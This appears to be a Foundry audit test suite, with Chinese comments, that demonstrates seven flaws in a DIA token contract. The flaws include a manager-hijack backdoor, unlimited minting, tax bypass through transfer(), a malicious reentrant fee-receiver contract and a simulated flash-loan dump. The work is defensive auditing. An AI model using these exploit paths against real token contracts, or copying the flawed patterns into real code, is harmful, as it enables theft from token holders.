// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/DIA.sol";

// ============================================================
//  辅助合约：模拟 RootDispatch（owner 角色）
//  核心后门：owner 可随时切换 manager 指向任意地址
// ============================================================
contract MaliciousRootDispatch is IRootDispatch {
    address public treasury;

    function setTreasury(address _treasury) external {
        treasury = _treasury;
    }

    function getSubContractAddress(string memory) external view override returns (address) {
        return treasury;
    }
}

// ============================================================
//  辅助合约：模拟恶意 feeTo 合约（重入攻击）
// ============================================================
contract MaliciousFeeReceiver is IAutoForwarder {
    DIA public token;
    address public victim;
    address public pair;
    uint256 public attackCount;
    uint256 public maxAttacks;

    constructor(address _token) {
        token = DIA(_token);
    }

    function setup(address _victim, address _pair, uint256 _maxAttacks) external {
        victim = _victim;
        pair = _pair;
        maxAttacks = _maxAttacks;
    }

    // 当 feeTo 收到手续费通知时触发重入
    function notifyReceived(address from, uint256 amount) external override {
        attackCount++;
        if (attackCount < maxAttacks) {
            // 重入：利用我们获得的余额再次卖出到 pair
            uint256 bal = token.balanceOf(address(this));
            if (bal > 0) {
                token.transfer(pair, bal);
            }
        }
    }
}

// ============================================================
//  辅助合约：模拟简单 feeTo（仅接收手续费，不做额外操作）
// ============================================================
contract SimpleFeeReceiver is IAutoForwarder {
    function notifyReceived(address, uint256) external override {
        // 正常接收，不做任何事
    }
}

// ============================================================
//  辅助合约：模拟 LP Pair 合约
// ============================================================
contract MockPair {
    // 简单的 mock，只接收代币
}

// ============================================================
//  主审计测试合约
// ============================================================
contract DIAAuditTest is Test {
    DIA public token;
    MaliciousRootDispatch public rootDispatch;
    MaliciousFeeReceiver public maliciousFeeTo;
    SimpleFeeReceiver public simpleFeeReceiver;
    MockPair public mockPair;

    address public attacker = address(0xBEEF);
    address public user1 = address(0x1111);
    address public user2 = address(0x2222);
    address public originalManager = address(0xAAAA);

    function setUp() public {
        // 部署 RootDispatch 模拟器
        rootDispatch = new MaliciousRootDispatch();
        rootDispatch.setTreasury(originalManager);

        // 部署 DIA 代币 (admin = address(this))
        token = new DIA("DIA Token", "DIA", address(rootDispatch));

        // 部署 MockPair
        mockPair = new MockPair();

        // 部署简单 feeTo 合约
        simpleFeeReceiver = new SimpleFeeReceiver();

        // 设置 pair 地址（需要 admin 权限）
        token.setPair(address(mockPair));

        // 设置 feeTo 为合约地址（避免 try-catch 对 EOA 报错）
        token.setFeeTo(address(simpleFeeReceiver));

        // 给测试用户铸造代币
        token.mint(user1, 1_000_000e6);
        token.mint(user2, 1_000_000e6);
        token.mint(attacker, 500_000e6);
    }

    // ================================================================
    //  漏洞 1：权限绕过 — owner 合约可动态切换 manager
    //  攻击路径：owner (RootDispatch) 改变 TREASURY 返回值，
    //           使任何人都能成为 "manager" 并调用 onlyAuthorized 函数
    // ================================================================
    function test_Vuln1_OwnerCanHijackManager() public {
        // 初始状态：attacker 不是 manager，不能 mint
        vm.startPrank(attacker);
        vm.expectRevert("Caller must be Manager");
        token.mint(attacker, 999_999e6);
        vm.stopPrank();

        // 攻击：owner 合约修改 TREASURY 指向 attacker
        rootDispatch.setTreasury(attacker);

        // 现在 attacker 可以调用所有 onlyAuthorized 函数
        vm.startPrank(attacker);
        token.mint(attacker, 999_999_999e6); // 无限增发
        vm.stopPrank();

        assertGt(token.balanceOf(attacker), 500_000e6);
        emit log_string("[CRITICAL] Vuln1: owner can hijack manager -> unlimited mint");
        emit log_named_uint("Attacker balance after exploit", token.balanceOf(attacker));
    }

    // ================================================================
    //  漏洞 2：transfer() 绕过卖出税
    //  攻击路径：用户直接调用 transfer() 将代币发送到 pair，
    //           完全跳过 transferFrom 中的手续费逻辑
    // ================================================================
    function test_Vuln2_TransferBypassesSellTax() public {
        // feeTo 已在 setUp 中设置为 simpleFeeReceiver 合约

        uint256 sellAmount = 100_000e6;

        // 方式1：通过 transferFrom 卖出（会被收 5% 税）
        vm.startPrank(user1);
        token.approve(address(this), sellAmount);
        vm.stopPrank();

        uint256 pairBalBefore = token.balanceOf(address(mockPair));
        token.transferFrom(user1, address(mockPair), sellAmount);
        uint256 pairBalAfterTransferFrom = token.balanceOf(address(mockPair));
        uint256 receivedViaTransferFrom = pairBalAfterTransferFrom - pairBalBefore;

        // 方式2：通过 transfer 直接卖出（零税！）
        vm.startPrank(user2);
        pairBalBefore = token.balanceOf(address(mockPair));
        token.transfer(address(mockPair), sellAmount);
        vm.stopPrank();
        uint256 pairBalAfterTransfer = token.balanceOf(address(mockPair));
        uint256 receivedViaTransfer = pairBalAfterTransfer - pairBalBefore;

        // transfer 全额到账，transferFrom 被扣税
        uint256 expectedFee = sellAmount * 5 / 100;
        assertEq(receivedViaTransfer, sellAmount); // transfer: 0% 税
        assertEq(receivedViaTransferFrom, sellAmount - expectedFee); // transferFrom: 5% 税

        emit log_string("[HIGH] Vuln2: transfer() bypasses sell tax completely");
        emit log_named_uint("Via transferFrom (with 5% tax)", receivedViaTransferFrom);
        emit log_named_uint("Via transfer (NO tax)", receivedViaTransfer);
    }

    // ================================================================
    //  漏洞 3：无限增发 — mint 无上限
    //  攻击路径：任何获得 manager/admin 权限的地址可无限铸造
    // ================================================================
    function test_Vuln3_UnlimitedMint() public {
        uint256 supplyBefore = token.totalSupply();

        // admin (this) 可以无限 mint
        token.mint(attacker, 1_000_000_000_000e6); // 1 万亿

        uint256 supplyAfter = token.totalSupply();
        assertEq(supplyAfter - supplyBefore, 1_000_000_000_000e6);

        emit log_string("[CRITICAL] Vuln3: No mint cap - unlimited inflation");
        emit log_named_uint("Minted amount", 1_000_000_000_000e6);
        emit log_named_uint("New total supply", supplyAfter);
    }

    // ================================================================
    //  漏洞 4：重入攻击 — feeTo 的 notifyReceived 回调
    //  攻击路径：设置恶意 feeTo 合约，在 notifyReceived 中
    //           重入 transfer 将收到的手续费代币再次转出
    // ================================================================
    function test_Vuln4_ReentrancyViaFeeTo() public {
        // 部署恶意 feeTo 合约
        maliciousFeeTo = new MaliciousFeeReceiver(address(token));
        maliciousFeeTo.setup(user1, address(mockPair), 3);

        // 用 admin 权限设置恶意 feeTo
        token.setFeeTo(address(maliciousFeeTo));

        // 给恶意合约一些初始代币（模拟已累积手续费）
        token.mint(address(maliciousFeeTo), 50_000e6);

        uint256 sellAmount = 200_000e6;

        // user1 approve 并通过 router 卖出
        vm.startPrank(user1);
        token.approve(address(this), sellAmount);
        vm.stopPrank();

        uint256 feeToBalBefore = token.balanceOf(address(maliciousFeeTo));
        uint256 pairBalBefore = token.balanceOf(address(mockPair));

        // 执行 transferFrom，触发 feeTo 的 notifyReceived
        token.transferFrom(user1, address(mockPair), sellAmount);

        uint256 feeToBalAfter = token.balanceOf(address(maliciousFeeTo));
        uint256 pairBalAfter = token.balanceOf(address(mockPair));

        // 恶意 feeTo 利用重入把手续费转给了 pair（相当于偷走了手续费）
        emit log_string("[MEDIUM] Vuln4: Reentrancy via feeTo.notifyReceived()");
        emit log_named_uint("feeTo balance before", feeToBalBefore);
        emit log_named_uint("feeTo balance after", feeToBalAfter);
        emit log_named_uint("pair received total", pairBalAfter - pairBalBefore);
        emit log_named_uint("Reentry attack count", maliciousFeeTo.attackCount());

        // 验证重入确实发生了
        assertGt(maliciousFeeTo.attackCount(), 0);
    }

    // ================================================================
    //  漏洞 5：隐藏后门 — onlyAuthorized 修饰器中 manager 动态更新
    //  每次调用 onlyAuthorized 函数时，manager 都会被重新赋值，
    //  这意味着 owner 合约可以在任何时刻"拉地毯"
    // ================================================================
    function test_Vuln5_DynamicManagerBackdoor() public {
        // 初始：originalManager 是 manager
        // admin (this) 放弃管理权
        token.quitManager();

        // 此时 admin = address(0)，理论上不应该有人能调用 onlyAuthorized
        // 但 owner 合约随时可以将 manager 设为新地址
        address newManager = address(0xDEAD);
        rootDispatch.setTreasury(newManager);

        // 新 manager 现在可以完全控制合约
        vm.startPrank(newManager);
        token.mint(newManager, 10_000_000e6);
        token.setPair(address(0));  // 禁用所有交易税
        token.setFeeTo(newManager); // 把所有手续费指向自己
        vm.stopPrank();

        assertEq(token.balanceOf(newManager), 10_000_000e6);
        emit log_string("[CRITICAL] Vuln5: Even after quitManager(), owner can reassign manager");
        emit log_named_uint("New manager minted", token.balanceOf(newManager));
    }

    // ================================================================
    //  漏洞 6：闪电贷 + 无税卖出的组合攻击
    //  攻击路径：通过闪电贷借入大量代币 -> 用 transfer 直接
    //           卖入 pair（绕过税） -> 砸盘套利
    // ================================================================
    function test_Vuln6_FlashLoanDumpAttack() public {
        // feeTo 已在 setUp 中设置

        // 模拟闪电贷：攻击者瞬间获得大量代币
        uint256 flashLoanAmount = 10_000_000e6;
        token.mint(attacker, flashLoanAmount); // 模拟闪电贷借入

        uint256 pairBalBefore = token.balanceOf(address(mockPair));

        // 攻击者直接 transfer 到 pair，零税砸盘
        vm.startPrank(attacker);
        token.transfer(address(mockPair), flashLoanAmount);
        vm.stopPrank();

        uint256 pairBalAfter = token.balanceOf(address(mockPair));

        // 全额到账，没有任何税收保护
        assertEq(pairBalAfter - pairBalBefore, flashLoanAmount);

        emit log_string("[HIGH] Vuln6: Flash loan + transfer() = zero-tax dump");
        emit log_named_uint("Dumped amount (no tax)", flashLoanAmount);
    }

    // ================================================================
    //  漏洞 7：feeWhitelist 可被滥用为「黑名单」
    //  admin/manager 可以通过操控白名单实现选择性抽水
    // ================================================================
    function test_Vuln7_SelectiveTaxation() public {
        // feeTo 已在 setUp 中设置为 simpleFeeReceiver 合约

        // 将 user1 加入白名单（免税），user2 不加（被抽税）
        address[] memory whitelist = new address[](1);
        whitelist[0] = user1;
        token.setFeeWhitelistBatch(whitelist, true);

        uint256 sellAmount = 100_000e6;

        // user1 卖出（免税）
        vm.startPrank(user1);
        token.approve(address(this), sellAmount);
        vm.stopPrank();
        uint256 pairBal1 = token.balanceOf(address(mockPair));
        token.transferFrom(user1, address(mockPair), sellAmount);
        uint256 user1Received = token.balanceOf(address(mockPair)) - pairBal1;

        // user2 卖出（被收 5% 税）
        vm.startPrank(user2);
        token.approve(address(this), sellAmount);
        vm.stopPrank();
        uint256 pairBal2 = token.balanceOf(address(mockPair));
        token.transferFrom(user2, address(mockPair), sellAmount);
        uint256 user2Received = token.balanceOf(address(mockPair)) - pairBal2;

        assertGt(user1Received, user2Received);

        emit log_string("[MEDIUM] Vuln7: Selective taxation via whitelist manipulation");
        emit log_named_uint("User1 (whitelisted) pair receives", user1Received);
        emit log_named_uint("User2 (not whitelisted) pair receives", user2Received);
        emit log_named_uint("Tax extracted from user2", sellAmount - user2Received);
    }
}
